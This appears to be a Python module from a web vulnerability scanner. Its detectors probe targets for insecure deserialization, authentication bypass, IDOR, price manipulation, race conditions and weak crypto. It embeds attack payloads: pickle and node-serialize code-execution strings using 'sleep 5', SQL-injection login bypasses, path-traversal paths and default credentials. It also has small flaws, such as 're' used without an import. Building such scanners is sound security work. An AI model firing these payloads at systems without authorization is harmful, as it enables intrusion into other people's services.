"""
ZDay Scanner - Additional Detectors
Deserialization, Auth Bypass, Logic, Race Conditions, Crypto
"""
import asyncio
import hashlib
import hmac
import time
from typing import List, Dict, Any, Optional
from dataclasses import dataclass

from .detection_engine import BaseDetector, DetectionContext, DetectionPhase
from src.core.models import Vulnerability, VulnerabilityType, Severity
from src.utils.http_client import HTTPResponse


class DeserializationDetector(BaseDetector):
    """Detects deserialization vulnerabilities"""

    def __init__(self, config):
        super().__init__(config)
        self.vuln_types = [VulnerabilityType.DESERIALIZATION]
        self.phase = DetectionPhase.ACTIVE

        # Serialized payloads for different languages
        self.payloads = {
            "java": [
                # CommonsCollections gadget chain
                b"aced0005737200116a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a65787000000001770400000001737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001",
            ],
            "python": [
                # Pickle RCE - cos.system("sleep 5")
                b"cos\nsystem\n(S'sleep 5'\ntR.",
                # Pickle RCE - builtins.eval
                b"cbuiltins\neval\n(S'__import__(\"os\").system(\"sleep 5\")'\ntR.",
            ],
            "php": [
                # PHP unserialize
                b'O:8:"stdClass":1:{s:3:"cmd";s:6:"sleep 5";}',
            ],
            "nodejs": [
                # node-serialize
                b'{"rce":"_$$ND_FUNC$$_function (){ require(\"child_process\").exec(\"sleep 5\") }()"}',
            ],
            "dotnet": [
                # BinaryFormatter
                b"AAEAAAD/////AQAAAAAAAAAMAgAAAF..."  # Truncated
            ],
        }

    async def detect(self, context: DetectionContext) -> List[Vulnerability]:
        vulns = []

        # Test endpoints that might accept serialized data
        forms = await self._find_serialization_endpoints(context)

        for endpoint in forms:
            for lang, payloads in self.payloads.items():
                for payload in payloads:
                    try:
                        resp = await context.http_client.post(
                            endpoint["url"],
                            data=payload,
                            headers={"Content-Type": endpoint.get("content_type", "application/octet-stream")}
                        )

                        if self._check_deserialization(resp, lang):
                            vuln = self._create_vuln(
                                type=VulnerabilityType.DESERIALIZATION,
                                severity=Severity.CRITICAL,
                                title=f"Insecure Deserialization ({lang})",
                                description=f"Potential insecure deserialization vulnerability in {lang} endpoint",
                                location=endpoint["url"],
                                payload=f"[{lang}] {payload[:50].hex()}...",
                                evidence=f"Response status: {resp.status}, duration: {resp.duration:.2f}s",
                                remediation="Avoid deserializing untrusted data. Use safe serialization formats (JSON). Implement integrity checks.",
                                cwe="CWE-502",
                                confidence=0.6,
                            )
                            vulns.append(vuln)
                            break
                    except Exception:
                        continue

        return vulns

    async def _find_serialization_endpoints(self, context: DetectionContext) -> List[Dict[str, Any]]:
        """Find endpoints that might accept serialized data"""
        endpoints = []

        try:
            resp = await context.http_client.get_with_browser_headers(context.target.url)
            if resp.status == 200:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(resp.text, "html.parser")

                for form in soup.find_all("form"):
                    enctype = form.get("enctype", "")
                    if "multipart" in enctype or "octet-stream" in enctype:
                        action = form.get("action", "")
                        action_url = action if action.startswith("http") else f"{context.target.url.rstrip('/')}/{action.lstrip('/')}"
                        endpoints.append({"url": action_url, "content_type": enctype})

                # Also check API endpoints
                # Look for .json, .xml, .serialized in URLs
        except Exception:
            pass

        return endpoints

    def _check_deserialization(self, resp: HTTPResponse, lang: str) -> bool:
        """Check for deserialization vulnerability"""
        # Time-based detection
        if resp.duration > 5.0:
            return True

        # Error-based detection
        error_patterns = {
            "java": [r"java\.io\.NotSerializableException", r"java\.lang\.ClassNotFoundException", r"org\.apache\.commons\.collections"],
            "python": [r"pickle\.UnpicklingError", r"_pickle\.UnpicklingError", r"AttributeError.*__reduce__"],
            "php": [r"unserialize.*Error", r"__PHP_Incomplete_Class"],
            "nodejs": [r"SerializationError", r"node-serialize"],
            "dotnet": [r"SerializationException", r"BinaryFormatter"],
        }

        patterns = error_patterns.get(lang, [])
        text = resp.text
        for pattern in patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True

        return False


class AuthBypassDetector(BaseDetector):
    """Detects authentication bypass vulnerabilities"""

    def __init__(self, config):
        super().__init__(config)
        self.vuln_types = [VulnerabilityType.AUTH_BYPASS]
        self.phase = DetectionPhase.ACTIVE

    async def detect(self, context: DetectionContext) -> List[Vulnerability]:
        vulns = []

        # Test common auth bypass techniques
        tests = [
            self._test_sql_auth_bypass,
            self._test_jwt_none_alg,
            self._test_path_traversal_auth,
            self._test_default_credentials,
            self._test_session_fixation,
        ]

        for test in tests:
            try:
                result = await test(context)
                vulns.extend(result)
            except Exception:
                pass

        return vulns

    async def _test_sql_auth_bypass(self, context: DetectionContext) -> List[Vulnerability]:
        """Test SQL injection in login forms"""
        vulns = []

        bypass_payloads = [
            "admin' --",
            "admin' #",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' UNION SELECT 'admin','password' --",
        ]

        try:
            resp = await context.http_client.get_with_browser_headers(context.target.url)
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, "html.parser")

            for form in soup.find_all("form"):
                action = form.get("action", "")
                action_url = action if action.startswith("http") else f"{context.target.url.rstrip('/')}/{action.lstrip('/')}"

                inputs = form.find_all("input")
                username_field = None
                password_field = None

                for inp in inputs:
                    if inp.get("type") in ["text", "email", "username"]:
                        username_field = inp.get("name")
                    elif inp.get("type") == "password":
                        password_field = inp.get("name")

                if username_field and password_field:
                    for payload in bypass_payloads:
                        data = {username_field: payload, password_field: "anything"}
                        try:
                            login_resp = await context.http_client.post(action_url, data=data)

                            # Check for successful login indicators
                            if self._check_login_success(login_resp):
                                vuln = self._create_vuln(
                                    type=VulnerabilityType.AUTH_BYPASS,
                                    severity=Severity.CRITICAL,
                                    title="SQL Injection Authentication Bypass",
                                    description=f"Login form vulnerable to SQL injection auth bypass",
                                    location=action_url,
                                    parameter=username_field,
                                    payload=payload,
                                    evidence=f"Login successful with payload: {payload}",
                                    remediation="Use parameterized queries. Implement proper input validation. Use prepared statements.",
                                    cwe="CWE-89",
                                    confidence=0.8,
                                )
                                vulns.append(vuln)
                                break
                        except Exception:
                            continue
        except Exception:
            pass

        return vulns

    def _check_login_success(self, resp: HTTPResponse) -> bool:
        """Check if login was successful"""
        # Check for session cookies
        if any("session" in c.lower() or "auth" in c.lower() or "token" in c.lower() for c in resp.cookies):
            return True

        # Check for redirect to dashboard/admin
        if resp.status in [301, 302, 303]:
            location = resp.headers.get("Location", "")
            if any(x in location.lower() for x in ["dashboard", "admin", "panel", "home", "welcome"]):
                return True

        # Check response content
        success_indicators = ["welcome", "dashboard", "logout", "profile", "admin panel"]
        text = resp.text.lower()
        if any(indicator in text for indicator in success_indicators):
            return True

        return False

    async def _test_jwt_none_alg(self, context: DetectionContext) -> List[Vulnerability]:
        """Test JWT none algorithm"""
        vulns = []

        # Look for JWT tokens in cookies or headers
        try:
            resp = await context.http_client.get_with_browser_headers(context.target.url)

            # Check cookies for JWT
            for cookie_name, cookie_value in resp.cookies.items():
                if self._is_jwt(cookie_value):
                    # Try to create token with none algorithm
                    # This is a simplified test
                    vuln = self._create_vuln(
                        type=VulnerabilityType.AUTH_BYPASS,
                        severity=Severity.HIGH,
                        title="Potential JWT Algorithm Confusion",
                        description="JWT token detected - verify algorithm validation",
                        location=context.target.url,
                        parameter=cookie_name,
                        evidence=f"JWT token found in cookie: {cookie_name}",
                        remediation="Ensure JWT library validates algorithm. Reject 'none' algorithm. Use RS256/ES256.",
                        cwe="CWE-347",
                        confidence=0.4,
                    )
                    vulns.append(vuln)
        except Exception:
            pass

        return vulns

    def _is_jwt(self, token: str) -> bool:
        parts = token.split('.')
        return len(parts) == 3 and all(len(p) > 0 for p in parts)

    async def _test_path_traversal_auth(self, context: DetectionContext) -> List[Vulnerability]:
        """Test path traversal for auth bypass"""
        vulns = []

        traversal_paths = [
            "/../admin",
            "/..;/admin",
            "/%2e%2e/admin",
            "/..%2fadmin",
        ]

        for path in traversal_paths:
            try:
                url = f"{context.target.url.rstrip('/')}{path}"
                resp = await context.http_client.get(url)

                if resp.status == 200 and self._check_login_success(resp):
                    vuln = self._create_vuln(
                        type=VulnerabilityType.AUTH_BYPASS,
                        severity=Severity.HIGH,
                        title="Path Traversal Authentication Bypass",
                        description=f"Authentication bypass via path traversal: {path}",
                        location=url,
                        evidence=f"Accessed protected resource with path traversal",
                        remediation="Normalize paths before authorization checks. Use canonical paths.",
                        cwe="CWE-22",
                        confidence=0.7,
                    )
                    vulns.append(vuln)
            except Exception:
                continue

        return vulns

    async def _test_default_credentials(self, context: DetectionContext) -> List[Vulnerability]:
        """Test common default credentials"""
        vulns = []

        defaults = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("root", "admin"),
            ("administrator", "admin"),
            ("admin", ""),
        ]

        try:
            resp = await context.http_client.get_with_browser_headers(context.target.url)
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, "html.parser")

            for form in soup.find_all("form"):
                action = form.get("action", "")
                action_url = action if action.startswith("http") else f"{context.target.url.rstrip('/')}/{action.lstrip('/')}"

                inputs = form.find_all("input")
                username_field = None
                password_field = None

                for inp in inputs:
                    if inp.get("type") in ["text", "email", "username"]:
                        username_field = inp.get("name")
                    elif inp.get("type") == "password":
                        password_field = inp.get("name")

                if username_field and password_field:
                    for user, pwd in defaults:
                        data = {username_field: user, password_field: pwd}
                        try:
                            login_resp = await context.http_client.post(action_url, data=data)
                            if self._check_login_success(login_resp):
                                vuln = self._create_vuln(
                                    type=VulnerabilityType.AUTH_BYPASS,
                                    severity=Severity.CRITICAL,
                                    title="Default Credentials",
                                    description=f"Default credentials work: {user}:{pwd}",
                                    location=action_url,
                                    parameter=username_field,
                                    payload=f"{user}:{pwd}",
                                    evidence=f"Successful login with default credentials",
                                    remediation="Change default credentials. Enforce strong passwords. Implement account lockout.",
                                    cwe="CWE-798",
                                    confidence=0.9,
                                )
                                vulns.append(vuln)
                                return vulns  # Found valid creds, stop testing
                        except Exception:
                            continue
        except Exception:
            pass

        return vulns

    async def _test_session_fixation(self, context: DetectionContext) -> List[Vulnerability]:
        """Test session fixation"""
        vulns = []

        try:
            # Get initial session
            resp1 = await context.http_client.get_with_browser_headers(context.target.url)
            session_before = resp1.cookies

            # Try to login
            # (simplified - would need actual login flow)

            # Get session after
            resp2 = await context.http_client.get_with_browser_headers(context.target.url)
            session_after = resp2.cookies

            # Check if session ID changed
            for cookie_name in session_before:
                if cookie_name in session_after:
                    if session_before[cookie_name] == session_after[cookie_name]:
                        vuln = self._create_vuln(
                            type=VulnerabilityType.SESSION_FIXATION,
                            severity=Severity.MEDIUM,
                            title="Session Fixation",
                            description="Session ID does not change after authentication",
                            location=context.target.url,
                            parameter=cookie_name,
                            evidence=f"Session cookie {cookie_name} unchanged after auth",
                            remediation="Regenerate session ID after login. Use secure session management.",
                            cwe="CWE-384",
                            confidence=0.6,
                        )
                        vulns.append(vuln)
        except Exception:
            pass

        return vulns


class LogicDetector(BaseDetector):
    """Detects business logic vulnerabilities"""

    def __init__(self, config):
        super().__init__(config)
        self.vuln_types = [VulnerabilityType.BUSINESS_LOGIC, VulnerabilityType.IDOR]
        self.phase = DetectionPhase.ACTIVE

    async def detect(self, context: DetectionContext) -> List[Vulnerability]:
        vulns = []

        # Test IDOR
        idor_vulns = await self._test_idor(context)
        vulns.extend(idor_vulns)

        # Test price manipulation
        price_vulns = await self._test_price_manipulation(context)
        vulns.extend(price_vulns)

        # Test quantity manipulation
        qty_vulns = await self._test_quantity_manipulation(context)
        vulns.extend(qty_vulns)

        # Test coupon abuse
        coupon_vulns = await self._test_coupon_abuse(context)
        vulns.extend(coupon_vulns)

        return vulns

    async def _test_idor(self, context: DetectionContext) -> List[Vulnerability]:
        """Test Insecure Direct Object References"""
        vulns = []

        try:
            resp = await context.http_client.get_with_browser_headers(context.target.url)
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, "html.parser")

            # Look for numeric IDs in URLs
            for link in soup.find_all("a", href=True):
                href = link["href"]
                # Find patterns like /user/123, /order/456, ?id=789
                import re
                id_matches = re.findall(r'[/=?&](?:id|user|order|account|profile)[/=](\d+)', href)

                for match in id_matches:
                    try:
                        original_id = int(match)
                        # Test adjacent IDs
                        for test_id in [original_id - 1, original_id + 1, 1, 2, 999]:
                            if test_id <= 0:
                                continue

                            test_url = href.replace(match, str(test_id))
                            if not test_url.startswith("http"):
                                test_url = f"{context.target.url.rstrip('/')}/{test_url.lstrip('/')}"

                            test_resp = await context.http_client.get(test_url)

                            if test_resp.status == 200 and test_resp.url != resp.url:
                                # Check if content is different (access to other user's data)
                                if len(test_resp.content) > 100:  # Arbitrary threshold
                                    vuln = self._create_vuln(
                                        type=VulnerabilityType.IDOR,
                                        severity=Severity.MEDIUM,
                                        title=f"Potential IDOR: {test_url}",
                                        description=f"Accessed resource with modified ID: {test_id}",
                                        location=test_url,
                                        parameter="id",
                                        payload=str(test_id),
                                        evidence=f"Status: {test_resp.status}, Size: {len(test_resp.content)}",
                                        remediation="Implement proper authorization checks. Use indirect references. Validate ownership.",
                                        cwe="CWE-639",
                                        confidence=0.5,
                                    )
                                    vulns.append(vuln)
                                    break
                    except Exception:
                        continue
        except Exception:
            pass

        return vulns

    async def _test_price_manipulation(self, context: DetectionContext) -> List[Vulnerability]:
        """Test price manipulation in cart/checkout"""
        vulns = []

        # Look for price parameters in forms
        try:
            resp = await context.http_client.get_with_browser_headers(context.target.url)
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, "html.parser")

            for form in soup.find_all("form"):
                for inp in form.find_all("input", {"type": "hidden"}):
                    name = inp.get("name", "").lower()
                    if "price" in name or "amount" in name or "cost" in name:
                        vuln = self._create_vuln(
                            type=VulnerabilityType.BUSINESS_LOGIC,
                            severity=Severity.HIGH,
                            title="Hidden Price Field Manipulation",
                            description=f"Price field '{inp.get('name')}' in hidden input - client-side manipulation possible",
                            location=form.get("action", context.target.url),
                            parameter=inp.get("name"),
                            payload=inp.get("value", ""),
                            evidence=f"Hidden input with price: {inp.get('name')}={inp.get('value')}",
                            remediation="Validate prices server-side. Don't trust client-submitted prices. Use server-side price calculation.",
                            cwe="CWE-840",
                            confidence=0.7,
                        )
                        vulns.append(vuln)
        except Exception:
            pass

        return vulns

    async def _test_quantity_manipulation(self, context: DetectionContext) -> List[Vulnerability]:
        """Test quantity manipulation"""
        vulns = []

        try:
            resp = await context.http_client.get_with_browser_headers(context.target.url)
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, "html.parser")

            for form in soup.find_all("form"):
                for inp in form.find_all("input", {"name": re.compile(r"qty|quantity|amount", re.I)}):
                    vuln = self._create_vuln(
                        type=VulnerabilityType.BUSINESS_LOGIC,
                        severity=Severity.MEDIUM,
                        title="Quantity Manipulation",
                        description=f"Quantity field '{inp.get('name')}' may allow negative or excessive values",
                        location=form.get("action", context.target.url),
                        parameter=inp.get("name"),
                        payload="negative/large value",
                        evidence=f"Quantity input found: {inp.get('name')}",
                        remediation="Validate quantity server-side. Enforce minimum/maximum limits. Check inventory.",
                        cwe="CWE-840",
                        confidence=0.5,
                    )
                    vulns.append(vuln)
        except Exception:
            pass

        return vulns

    async def _test_coupon_abuse(self, context: DetectionContext) -> List[Vulnerability]:
        """Test coupon/promo code abuse"""
        vulns = []

        # This would require more complex logic - placeholder
        return vulns


class RaceConditionDetector(BaseDetector):
    """Detects race condition vulnerabilities"""

    def __init__(self, config):
        super().__init__(config)
        self.vuln_types = [VulnerabilityType.RACE_CONDITION]
        self.phase = DetectionPhase.INTRUSIVE

    async def detect(self, context: DetectionContext) -> List[Vulnerability]:
        vulns = []

        # Test concurrent requests to sensitive endpoints
        # This is intrusive and should be done carefully

        try:
            # Find endpoints that might have race conditions
            endpoints = await self._find_race_endpoints(context)

            for endpoint in endpoints:
                # Send multiple concurrent requests
                tasks = [context.http_client.post(endpoint["url"], data=endpoint["data"]) for _ in range(10)]
                responses = await asyncio.gather(*tasks, return_exceptions=True)

                # Analyze responses for inconsistencies
                successes = [r for r in responses if isinstance(r, HTTPResponse) and r.status == 200]

                if len(successes) > 1:
                    # Check if all succeeded when only one should
                    vuln = self._create_vuln(
                        type=VulnerabilityType.RACE_CONDITION,
                        severity=Severity.MEDIUM,
                        title="Potential Race Condition",
                        description=f"Multiple concurrent requests succeeded on {endpoint['url']}",
                        location=endpoint["url"],
                        evidence=f"{len(successes)}/10 concurrent requests succeeded",
                        remediation="Implement proper locking. Use database transactions. Add idempotency keys.",
                        cwe="CWE-362",
                        confidence=0.4,
                    )
                    vulns.append(vuln)
        except Exception:
            pass

        return vulns

    async def _find_race_endpoints(self, context: DetectionContext) -> List[Dict[str, Any]]:
        """Find endpoints susceptible to race conditions"""
        endpoints = []

        # Common endpoints: coupon application, password reset, registration, voting
        race_keywords = ["coupon", "promo", "reset", "register", "vote", "like", "claim", "redeem"]

        try:
            resp = await context.http_client.get_with_browser_headers(context.target.url)
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, "html.parser")

            for form in soup.find_all("form"):
                action = form.get("action", "")
                action_text = (action + " " + form.get_text()).lower()

                if any(kw in action_text for kw in race_keywords):
                    inputs = {}
                    for inp in form.find_all("input"):
                        if inp.get("name"):
                            inputs[inp["name"]] = inp.get("value", "test")

                    action_url = action if action.startswith("http") else f"{context.target.url.rstrip('/')}/{action.lstrip('/')}"
                    endpoints.append({"url": action_url, "data": inputs})
        except Exception:
            pass

        return endpoints


class CryptoDetector(BaseDetector):
    """Detects cryptographic vulnerabilities"""

    def __init__(self, config):
        super().__init__(config)
        self.vuln_types = [VulnerabilityType.WEAK_CRYPTO, VulnerabilityType.CERTIFICATE_ISSUES]
        self.phase = DetectionPhase.PASSIVE

    async def detect(self, context: DetectionContext) -> List[Vulnerability]:
        vulns = []

        # Check SSL/TLS
        tls_vulns = await self._check_tls(context)
        vulns.extend(tls_vulns)

        # Check for weak hashes in cookies/tokens
        hash_vulns = await self._check_weak_hashes(context)
        vulns.extend(hash_vulns)

        # Check for insecure crypto in JS
        js_vulns = await self._check_js_crypto(context)
        vulns.extend(js_vulns)

        return vulns

    async def _check_tls(self, context: DetectionContext) -> List[Vulnerability]:
        """Check TLS configuration"""
        vulns = []

        if not context.target.url.startswith("https://"):
            vuln = self._create_vuln(
                type=VulnerabilityType.CERTIFICATE_ISSUES,
                severity=Severity.HIGH,
                title="HTTP Instead of HTTPS",
                description="Target uses HTTP instead of HTTPS",
                location=context.target.url,
                remediation="Enable HTTPS with valid TLS certificate. Redirect HTTP to HTTPS. Enable HSTS.",
                cwe="CWE-319",
                confidence=1.0,
            )
            vulns.append(vuln)
            return vulns

        # Check certificate via HTTP client
        try:
            resp = await context.http_client.get_with_browser_headers(context.target.url)
            # The HTTP client doesn't expose cert details easily
            # In production, use ssl module to check cert
        except Exception:
            pass

        return vulns

    async def _check_weak_hashes(self, context: DetectionContext) -> List[Vulnerability]:
        """Check for weak hashes in cookies/tokens"""
        vulns = []

        try:
            resp = await context.http_client.get_with_browser_headers(context.target.url)

            # Check cookies for weak hashes (MD5, SHA1 patterns)
            for cookie_name, cookie_value in resp.cookies.items():
                if self._looks_like_md5(cookie_value) or self._looks_like_sha1(cookie_value):
                    vuln = self._create_vuln(
                        type=VulnerabilityType.WEAK_CRYPTO,
                        severity=Severity.LOW,
                        title=f"Weak Hash in Cookie: {cookie_name}",
                        description=f"Cookie appears to use weak hash (MD5/SHA1)",
                        location=context.target.url,
                        parameter=cookie_name,
                        evidence=f"Cookie value: {cookie_value[:32]}...",
                        remediation="Use strong hashes (SHA-256+). Use HMAC for integrity. Implement secure session tokens.",
                        cwe="CWE-327",
                        confidence=0.4,
                    )
                    vulns.append(vuln)
        except Exception:
            pass

        return vulns

    def _looks_like_md5(self, value: str) -> bool:
        return len(value) == 32 and all(c in '0123456789abcdef' for c in value.lower())

    def _looks_like_sha1(self, value: str) -> bool:
        return len(value) == 40 and all(c in '0123456789abcdef' for c in value.lower())

    async def _check_js_crypto(self, context: DetectionContext) -> List[Vulnerability]:
        """Check for insecure crypto in JavaScript"""
        vulns = []

        try:
            resp = await context.http_client.get_with_browser_headers(context.target.url)

            # Check for crypto patterns in inline scripts
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, "html.parser")

            weak_patterns = [
                (r"md5\s*\(", "MD5"),
                (r"sha1\s*\(", "SHA1"),
                (r"CryptoJS\.MD5", "CryptoJS MD5"),
                (r"CryptoJS\.SHA1", "CryptoJS SHA1"),
                (r"crypto\.createHash\s*\(\s*md5", "Node.js MD5"),
                (r"crypto\.createHash\s*\(\s*sha1", "Node.js SHA1"),
                (r"Math\.random\(\)", "Math.random() for crypto"),
            ]

            for script in soup.find_all("script"):
                if not script.get("src"):
                    content = script.string or ""
                    for pattern, name in weak_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            vuln = self._create_vuln(
                                type=VulnerabilityType.WEAK_CRYPTO,
                                severity=Severity.MEDIUM,
                                title=f"Weak Client-Side Crypto: {name}",
                                description=f"JavaScript uses weak cryptographic function: {name}",
                                location=context.target.url,
                                evidence=f"Pattern found: {pattern}",
                                remediation="Use strong cryptographic algorithms. Use Web Crypto API. Avoid client-side crypto for secrets.",
                                cwe="CWE-327",
                                confidence=0.6,
                            )
                            vulns.append(vuln)
        except Exception:
            pass

        return vulns
